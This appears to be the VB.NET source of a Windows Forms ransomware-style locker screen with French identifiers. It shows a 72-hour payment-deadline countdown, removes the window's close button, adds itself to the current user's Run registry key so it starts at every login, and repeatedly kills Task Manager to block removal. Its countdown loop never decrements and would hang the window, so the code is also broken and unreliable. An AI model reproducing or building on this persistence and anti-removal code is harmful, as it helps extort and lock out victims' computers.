Imports Microsoft.Win32
Imports System.Text.RegularExpressions

Public Class Form1
    Public Shared deadlinePaiement As Integer = 259200
    Protected Overrides ReadOnly Property CreateParams As CreateParams
        Get
            Dim CurrentParams As CreateParams = MyBase.CreateParams
            Const CS_NOCLOSE As Integer = &H200
            CurrentParams.ClassStyle = CurrentParams.ClassStyle Or CS_NOCLOSE
            Return CurrentParams
        End Get
    End Property

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Dim CurrentUser As Microsoft.Win32.RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run")
        With CurrentUser
            .OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run")
            .SetValue(Application.ProductName, Application.ExecutablePath)
        End With
        lb_date.Text = CType(Date.Now.Date, String) + " " + CType(Date.Now.TimeOfDay.ToString(), String)
        Timer1.Enabled = True
        Timer1.Start()
        Timer.Start()
    End Sub

    Private Sub Timer_Tick(sender As Object, e As EventArgs) Handles Timer.Tick
        Try
            For Each proc As Process In Process.GetProcesses
                If proc.ProcessName = "Taskmgr" Then
                    proc.Kill()
                End If
            Next
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        While deadlinePaiement > 0
            lb_compteRebours.Text = "eee"
        End While

    End Sub

    Private Sub TableLayoutPanel3_Paint(sender As Object, e As PaintEventArgs) Handles TableLayoutPanel3.Paint

    End Sub
End Class